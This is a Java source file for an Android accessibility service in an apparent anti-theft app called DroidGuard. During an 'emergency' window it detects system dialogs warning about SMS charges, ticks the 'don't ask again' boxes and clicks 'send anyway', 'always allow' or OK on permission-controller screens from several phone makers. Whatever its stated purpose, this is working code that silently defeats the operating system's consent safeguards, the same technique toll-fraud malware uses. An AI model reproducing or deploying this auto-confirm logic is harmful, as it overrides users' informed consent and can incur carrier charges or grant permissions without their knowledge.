package com.antitheft.droidguard;

import android.accessibilityservice.AccessibilityService;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.SystemClock;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;
import java.util.Locale;

/**
 * DroidGuard Smart Security Auto-Confirm Service
 * 
 * Operates in 100% SLEEP/STANDBY mode during normal phone usage.
 * Only wakes up for a short window (e.g. 45-60s) when DroidGuard triggers
 * an emergency SMS dispatch or enters theft mode.
 * 
 * Strictly ignores keyboards (Baidu, Gboard, SwiftKey, etc.) and user applications.
 */
public class AutoConfirmService extends AccessibilityService {
    private static final String TAG = "AutoConfirmService";
    public static AutoConfirmService instance = null;

    private static final String PREFS_NAME = "droidguard_security_prefs";
    private static final String KEY_EMERGENCY_ARMED_UNTIL = "emergency_armed_until";

    private static volatile long emergencyArmedUntilMemory = 0L;
    private static long lastActionTimestamp = 0L;
    private static final long ACTION_DEBOUNCE_MS = 1500L;

    // Strict Permission & Security Dialog Packages ONLY (where SMS carrier prompts appear)
    private static final String[] PERMISSION_DIALOG_PACKAGES = new String[] {
        "com.google.android.permissioncontroller",
        "com.android.permissioncontroller",
        "com.android.packageinstaller",
        "com.samsung.android.permissioncontroller",
        "com.miui.securitycenter",
        "com.oplus.securitypermission",
        "com.coloros.securitypermission",
        "com.nearme.safecenter",
        "com.transsion.phonemanager",
        "com.huawei.systemmanager"
    };

    // Explicit SMS Confirmation Warning Phrases (Arabic, French, English)
    private static final String[] SMS_WARNING_KEYWORDS = new String[] {
        "سيرسل رسالة sms",
        "سيرسل رسالة",
        "رسالة sms قد تتسبب",
        "فرض رسوم",
        "رسوم إضافية",
        "قد يؤدي هذا إلى فرض رسوم",
        "رسوم مشغل شبكة الجوال",
        "محاولة إرسال رسالة",
        "إرسال رسائل قصيرة",
        "souhaite envoyer un sms",
        "souhaite envoyer un message",
        "peut entraîner des frais",
        "des frais peuvent s'appliquer",
        "frais sur votre facture",
        "sms surtaxé",
        "tente d'envoyer un sms",
        "autoriser l'envoi de sms",
        "would like to send a message",
        "would like to send an sms",
        "cause charges",
        "carrier charges",
        "charges may apply",
        "send premium sms",
        "is attempting to send an sms"
    };

    // Specific button View IDs used in system SMS confirmation dialogs
    private static final String[] POSITIVE_VIEW_IDS = new String[] {
        "com.android.permissioncontroller:id/permission_allow_button",
        "com.android.permissioncontroller:id/permission_allow_always_button",
        "com.google.android.permissioncontroller:id/permission_allow_button",
        "com.google.android.permissioncontroller:id/permission_allow_always_button",
        "com.android.packageinstaller:id/permission_allow_button",
        "com.samsung.android.permissioncontroller:id/permission_allow_button",
        "com.samsung.android.permissioncontroller:id/permission_allow_always_button",
        "com.miui.securitycenter:id/accept",
        "com.miui.securitycenter:id/btn_allow",
        "com.oplus.safecenter:id/btn_confirm",
        "com.coloros.safecenter:id/btn_confirm",
        "com.oplus.securitypermission:id/permission_allow_button",
        "com.coloros.securitypermission:id/permission_allow_button"
    };

    // Explicit Full Positive Button Phrases (Will NOT match random buttons in keyboards or search bars)
    private static final String[] POSITIVE_BUTTON_TEXTS = new String[] {
        "إرسال على أي حال",
        "ارسال على اي حال",
        "السماح دائماً",
        "السماح دائما",
        "سماح دائماً",
        "سماح دائما",
        "envoyer quand même",
        "toujours autoriser",
        "send anyway",
        "always allow",
        "allow all the time"
    };

    // Checkbox IDs for "Remember my choice"
    private static final String[] CHECKBOX_VIEW_IDS = new String[] {
        "com.android.permissioncontroller:id/do_not_ask_again_checkbox",
        "com.google.android.permissioncontroller:id/do_not_ask_again_checkbox",
        "com.samsung.android.permissioncontroller:id/do_not_ask_again_checkbox",
        "com.samsung.android.messaging:id/remember_choice",
        "com.miui.securitycenter:id/remember",
        "com.oplus.safecenter:id/checkbox",
        "com.coloros.safecenter:id/checkbox"
    };

    /**
     * Arms the AutoConfirmService for an active emergency window (e.g. 45 to 60 seconds).
     * Call this whenever an emergency SMS is triggered or theft event occurs.
     */
    public static void armEmergencyWindow(Context context, long durationMs) {
        long until = System.currentTimeMillis() + (durationMs > 0 ? durationMs : 45_000L);
        emergencyArmedUntilMemory = until;
        try {
            if (context != null) {
                SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                prefs.edit().putLong(KEY_EMERGENCY_ARMED_UNTIL, until).apply();
            }
        } catch (Exception ignored) {}
        Log.i(TAG, "🚨 AutoConfirmService ARMED for emergency dispatch window until: " + until);
    }

    /**
     * Checks if the service is currently armed for emergency auto-confirmation.
     */
    public static boolean isEmergencyWindowActive(Context context) {
        long now = System.currentTimeMillis();
        if (now < emergencyArmedUntilMemory) {
            return true;
        }
        try {
            if (context != null) {
                SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                long storedUntil = prefs.getLong(KEY_EMERGENCY_ARMED_UNTIL, 0L);
                if (now < storedUntil) {
                    emergencyArmedUntilMemory = storedUntil;
                    return true;
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        Log.i(TAG, "AutoConfirmService initialized in SLEEP mode. Ready for emergency dispatches.");
    }

    @Override
    public void onDestroy() {
        if (instance == this) instance = null;
        super.onDestroy();
    }

    public static boolean openNativePowerMenu() {
        if (instance != null) {
            return instance.performGlobalAction(GLOBAL_ACTION_POWER_DIALOG);
        }
        return false;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        // 🛑 CRITICAL RULE 1: If not in emergency theft dispatch mode, SLEEP IMMEDIATELY!
        // Prevents any interference with normal typing, keyboard, search bars, or daily apps.
        if (!isEmergencyWindowActive(this)) {
            return;
        }

        try {
            CharSequence pkgName = event.getPackageName();
            if (pkgName == null) return;
            String pkgStr = pkgName.toString().toLowerCase(Locale.ROOT);

            // 🛑 CRITICAL RULE 2: Strictly ignore all Keyboards, Input Methods, Launchers, and User Apps
            if (pkgStr.contains("inputmethod") || pkgStr.contains("keyboard") || pkgStr.contains("ime") ||
                pkgStr.contains("baidu") || pkgStr.contains("gboard") || pkgStr.contains("swiftkey") ||
                pkgStr.contains("launcher") || pkgStr.contains("tiktok") || pkgStr.contains("whatsapp") ||
                pkgStr.contains("chrome") || pkgStr.contains("browser") || pkgStr.contains("youtube") ||
                pkgStr.contains("facebook") || pkgStr.contains("instagram") || pkgStr.contains("droidguard")) {
                return;
            }

            // 🛑 CRITICAL RULE 3: Must strictly belong to an official Android permission dialog package
            boolean isPermissionPkg = false;
            for (String pPkg : PERMISSION_DIALOG_PACKAGES) {
                if (pkgStr.equals(pPkg) || pkgStr.startsWith(pPkg)) {
                    isPermissionPkg = true;
                    break;
                }
            }
            if (!isPermissionPkg && (pkgStr.equals("android") || pkgStr.equals("com.android.systemui"))) {
                isPermissionPkg = true;
            }

            if (!isPermissionPkg) {
                return; // Not a system security dialog - ignore!
            }

            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) {
                rootNode = event.getSource();
            }
            if (rootNode == null) return;

            // 🛑 CRITICAL RULE 4: Must contain explicit SMS cost warning phrase in dialog
            boolean isSmsWarningDialog = false;
            for (String kw : SMS_WARNING_KEYWORDS) {
                List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(kw);
                if (nodes != null && !nodes.isEmpty()) {
                    isSmsWarningDialog = true;
                    Log.i(TAG, "🚨 Confirmed SMS dialog via keyword [" + kw + "] on package [" + pkgStr + "]");
                    break;
                }
            }

            if (!isSmsWarningDialog) {
                return; // No SMS warning text found - do not click anything!
            }

            long now = SystemClock.uptimeMillis();
            if (now - lastActionTimestamp < ACTION_DEBOUNCE_MS) {
                return;
            }
            lastActionTimestamp = now;

            // Step 1: Auto-check "Remember my choice" / "عدم السؤال مرة أخرى"
            autoCheckRememberChoice(rootNode);

            // Step 2: Attempt clicking positive button by known OEM View IDs
            for (String viewId : POSITIVE_VIEW_IDS) {
                try {
                    List<AccessibilityNodeInfo> positiveButtons = rootNode.findAccessibilityNodeInfosByViewId(viewId);
                    if (positiveButtons != null && !positiveButtons.isEmpty()) {
                        for (AccessibilityNodeInfo btn : positiveButtons) {
                            if (btn.isEnabled() && clickNodeOrParent(btn)) {
                                Log.i(TAG, "✅ Auto-confirmed SMS send via OEM View ID [" + viewId + "] successfully!");
                                return;
                            }
                        }
                    }
                } catch (Exception ignored) {}
            }

            // Step 3: Attempt clicking positive button by matching exact multi-word positive phrases
            for (String positiveText : POSITIVE_BUTTON_TEXTS) {
                List<AccessibilityNodeInfo> matchingButtons = rootNode.findAccessibilityNodeInfosByText(positiveText);
                if (matchingButtons != null && !matchingButtons.isEmpty()) {
                    for (AccessibilityNodeInfo btn : matchingButtons) {
                        if (btn.isEnabled() && clickNodeOrParent(btn)) {
                            Log.i(TAG, "✅ Auto-confirmed SMS send via text [" + positiveText + "] successfully!");
                            return;
                        }
                    }
                }
            }

            // Step 4: Fallback to standard Dialog OK/Button1 ONLY because isSmsWarningDialog is TRUE
            try {
                List<AccessibilityNodeInfo> standardButtons = rootNode.findAccessibilityNodeInfosByViewId("android:id/button1");
                if (standardButtons != null && !standardButtons.isEmpty()) {
                    for (AccessibilityNodeInfo btn : standardButtons) {
                        if (btn.isEnabled() && clickNodeOrParent(btn)) {
                            Log.i(TAG, "✅ Auto-confirmed SMS send via dialog button1 successfully!");
                            return;
                        }
                    }
                }
            } catch (Exception ignored) {}

        } catch (Exception e) {
            Log.w(TAG, "Error in onAccessibilityEvent: " + e.getMessage());
        }
    }

    /**
     * Check any unchecked checkbox in the dialog (e.g. "Do not ask again" / "تذكر خياري" / "Ne plus me demander")
     */
    private void autoCheckRememberChoice(AccessibilityNodeInfo root) {
        if (root == null) return;

        // Try known View IDs first
        for (String cid : CHECKBOX_VIEW_IDS) {
            try {
                List<AccessibilityNodeInfo> checkboxes = root.findAccessibilityNodeInfosByViewId(cid);
                if (checkboxes != null) {
                    for (AccessibilityNodeInfo cb : checkboxes) {
                        if (cb.isCheckable() && !cb.isChecked()) {
                            cb.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Log.i(TAG, "Checked 'Remember my choice' option via View ID: " + cid);
                        }
                    }
                }
            } catch (Exception ignored) {}
        }

        // Try matching common checkbox text in Arabic, French, English
        String[] rememberTexts = new String[] {
            "تذكر خياري",
            "عدم السؤال مرة أخرى",
            "تذكر اختياري",
            "لا تسأل مرة أخرى",
            "ne plus me demander",
            "se souvenir de mon choix",
            "mémoriser mon choix",
            "remember my choice",
            "don't ask again",
            "do not ask again"
        };
        for (String rText : rememberTexts) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(rText);
            if (nodes != null) {
                for (AccessibilityNodeInfo node : nodes) {
                    if (node.isCheckable() && !node.isChecked()) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        Log.i(TAG, "Checked 'Remember my choice' option via text: " + rText);
                    } else {
                        AccessibilityNodeInfo parent = node.getParent();
                        if (parent != null) {
                            for (int i = 0; i < parent.getChildCount(); i++) {
                                AccessibilityNodeInfo child = parent.getChild(i);
                                if (child != null && child.isCheckable() && !child.isChecked()) {
                                    child.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                    Log.i(TAG, "Checked 'Remember my choice' sibling checkbox for: " + rText);
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    private boolean clickNodeOrParent(AccessibilityNodeInfo node) {
        if (node == null) return false;
        if (node.isClickable()) {
            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }
        AccessibilityNodeInfo parent = node.getParent();
        if (parent != null) {
            if (parent.isClickable()) {
                return parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
            AccessibilityNodeInfo grandParent = parent.getParent();
            if (grandParent != null && grandParent.isClickable()) {
                return grandParent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
        }
        return false;
    }

    @Override
    public void onInterrupt() {
        Log.i(TAG, "AutoConfirmService interrupted.");
    }
}
